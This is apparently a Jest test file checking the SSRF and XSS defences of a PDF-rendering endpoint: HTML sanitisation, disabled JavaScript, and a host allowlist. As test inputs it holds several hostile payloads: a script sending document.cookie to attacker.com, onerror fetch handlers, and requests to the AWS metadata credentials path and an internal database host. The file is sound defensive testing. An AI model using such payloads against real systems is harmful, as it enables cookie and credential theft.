/**
 * SSRF defences for the PDF endpoint (sec-audit C-2).
 *
 * Three-layer defence:
 *   1. sanitiseQuoteHtml strips dangerous tags / attributes / URLs
 *   2. JavaScript disabled in the rendering page
 *   3. Network request interception with a host allowlist
 *
 * The first layer is unit-testable (pure function on a string). The
 * second and third are source-level asserts on pdfRenderer.js.
 */
import { sanitiseQuoteHtml } from '../../pdfRenderer.js';
import { readFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(__dirname, '../../');
const rendererSrc = readFileSync(join(repoRoot, 'pdfRenderer.js'), 'utf8');

describe('sanitiseQuoteHtml — script & dangerous-tag stripping', () => {
  test('strips <script> tag and its contents (no exfil via fetch)', () => {
    const out = sanitiseQuoteHtml(
      '<p>ok</p><script>fetch("//attacker.com/x?d="+document.cookie)</script>'
    );
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/attacker\.com/);
    expect(out).not.toMatch(/document\.cookie/);
  });

  test('strips <iframe> (no internal-network probing)', () => {
    const out = sanitiseQuoteHtml(
      '<iframe src="http://postgres-8dej.railway.internal:5432"></iframe>'
    );
    expect(out).not.toMatch(/<iframe/i);
    expect(out).not.toMatch(/railway\.internal/);
  });

  test('strips <object> and <embed>', () => {
    const out = sanitiseQuoteHtml(
      '<object data="http://evil/"></object><embed src="http://evil/" />'
    );
    expect(out).not.toMatch(/<object/i);
    expect(out).not.toMatch(/<embed/i);
  });

  test('strips inline event handlers (onclick, onerror, onload)', () => {
    const out = sanitiseQuoteHtml(
      '<img src="x" onerror="fetch(\'//attacker\')"><div onclick="alert(1)">x</div>'
    );
    expect(out).not.toMatch(/onerror=/i);
    expect(out).not.toMatch(/onclick=/i);
    expect(out).not.toMatch(/attacker/);
  });

  test('strips javascript: URLs in <a href>', () => {
    const out = sanitiseQuoteHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript:/i);
  });

  test('strips <link rel="stylesheet" href> pointing to internal hosts', () => {
    const out = sanitiseQuoteHtml(
      '<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/" />'
    );
    expect(out).not.toMatch(/<link/i);
    expect(out).not.toMatch(/169\.254/);
  });
});

describe('sanitiseQuoteHtml — URL allowlisting', () => {
  test('drops <img src> pointing at an off-allowlist host (no SSRF probe)', () => {
    // AWS metadata endpoint — classic SSRF target.
    const out = sanitiseQuoteHtml(
      '<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />'
    );
    // The img tag may survive but its src must be stripped.
    expect(out).not.toMatch(/169\.254/);
    expect(out).not.toMatch(/security-credentials/);
  });

  test('drops <img src> pointing at attacker exfil URL', () => {
    const out = sanitiseQuoteHtml('<img src="http://attacker.com/steal?d=secret" />');
    expect(out).not.toMatch(/attacker\.com/);
    expect(out).not.toMatch(/steal/);
  });

  test('preserves data:image base64 (used for the photo appendix)', () => {
    const dataUrl =
      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAA';
    const out = sanitiseQuoteHtml(`<img src="${dataUrl}" />`);
    expect(out).toContain(dataUrl);
  });

  test('blocks data:text/html (HTML smuggling vector)', () => {
    const out = sanitiseQuoteHtml(
      '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" />'
    );
    expect(out).not.toMatch(/data:text\/html/);
  });

  test('preserves Google Fonts URLs (allowlisted)', () => {
    const out = sanitiseQuoteHtml(
      '<a href="https://fonts.googleapis.com/css2">fonts</a>'
    );
    expect(out).toContain('fonts.googleapis.com');
  });

  test('preserves relative URLs (own origin)', () => {
    const out = sanitiseQuoteHtml('<a href="/dashboard">go</a>');
    expect(out).toContain('href="/dashboard"');
  });
});

describe('sanitiseQuoteHtml — preserves the legitimate quote document', () => {
  test('headings, paragraphs, lists, tables all pass through', () => {
    const html =
      '<h1>Quote</h1><p>Hello <strong>Angela</strong></p><ul><li>One</li></ul>' +
      '<table><tr><td>row</td></tr></table>';
    const out = sanitiseQuoteHtml(html);
    expect(out).toContain('<h1>Quote</h1>');
    expect(out).toContain('<strong>Angela</strong>');
    expect(out).toContain('<table>');
  });

  test('class + style attributes survive (Tailwind, inline styling)', () => {
    const out = sanitiseQuoteHtml(
      '<div class="text-lg" style="color: red">x</div>'
    );
    expect(out).toContain('class="text-lg"');
    // sanitize-html normalises whitespace inside style values, hence
    // the space tolerance here.
    expect(out).toMatch(/style="color:\s*red"/);
  });

  test('null / undefined / empty input safely returns empty string', () => {
    expect(sanitiseQuoteHtml(null)).toBe('');
    expect(sanitiseQuoteHtml(undefined)).toBe('');
    expect(sanitiseQuoteHtml('')).toBe('');
  });
});

describe('pdfRenderer — defence layers wired', () => {
  test('sanitises quoteHtml before injecting into the page', () => {
    expect(rendererSrc).toMatch(/sanitiseQuoteHtml\s*\(\s*quoteHtml\s*\)/);
  });

  test('disables JavaScript in the Chromium page', () => {
    expect(rendererSrc).toMatch(/setJavaScriptEnabled\s*\(\s*false\s*\)/);
  });

  test('intercepts every request and aborts off-allowlist hosts', () => {
    expect(rendererSrc).toMatch(/setRequestInterception\s*\(\s*true\s*\)/);
    expect(rendererSrc).toMatch(/REQUEST_ALLOWLIST/);
    expect(rendererSrc).toMatch(/req\.abort/);
  });

  test('blocked off-allowlist requests log a warning (forensic trail)', () => {
    expect(rendererSrc).toMatch(/console\.warn[\s\S]{0,200}blocked off-allowlist/);
  });

  test('allowlist contains only trusted CDNs (fonts, Tailwind)', () => {
    // Extract the literal allowlist Set body so we test only what's
    // actually in the runtime allowlist, not text mentioned in comments.
    const setMatch = rendererSrc.match(
      /const\s+REQUEST_ALLOWLIST\s*=\s*new\s+Set\(\[([\s\S]*?)\]\)/
    );
    expect(setMatch).not.toBeNull();
    const body = setMatch[1];
    expect(body).toMatch(/fonts\.googleapis\.com/);
    expect(body).toMatch(/fonts\.gstatic\.com/);
    expect(body).toMatch(/cdn\.tailwindcss\.com/);
    // Anything else in the set is suspect — count entries, expect 3.
    const entries = body.match(/'[^']+'/g) || [];
    expect(entries.length).toBe(3);
  });
});
